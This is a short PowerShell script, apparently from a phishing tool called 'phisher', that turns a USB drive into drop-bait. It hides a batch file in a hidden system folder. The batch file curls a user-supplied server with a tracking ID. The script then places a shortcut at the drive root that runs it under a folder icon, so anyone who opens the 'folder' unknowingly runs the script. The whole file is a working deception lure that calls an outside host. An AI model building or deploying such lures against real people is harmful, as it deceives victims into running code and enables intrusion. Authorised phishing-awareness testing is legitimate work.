# Get drive letter
$DRIVE=Read-Host -Prompt "USB Drive Path. ex: 'D:\'"
$IP=Read-Host -Prompt "Location that the server is at"

$GEN=.\phisher --generate "Example Location"
# $GEN="id,loc" # Testing line
Write-Output $GEN >> gen-location.txt

$GEN=$GEN -split ","
$ID=$GEN[0]

# Create hidden folder and it's script
$SCRIPT_LOC="$DRIVE\hidden\run.bat"
New-Item -ItemType Directory -Force -Path "$DRIVE\hidden"
Write-Output "curl http://$IP/$ID" > $SCRIPT_LOC
attrib +r +h +s "$DRIVE\hidden"

# Create shortcut from script to root
$ws = New-Object -ComObject WScript.Shell;
$s = $ws.CreateShortcut("$DRIVE\test.lnk");
$S.RelativePath = ".\hidden\run.bat"
$S.IconLocation = "%SystemRoot%\System32\SHELL32.dll,3"
$S.Save();
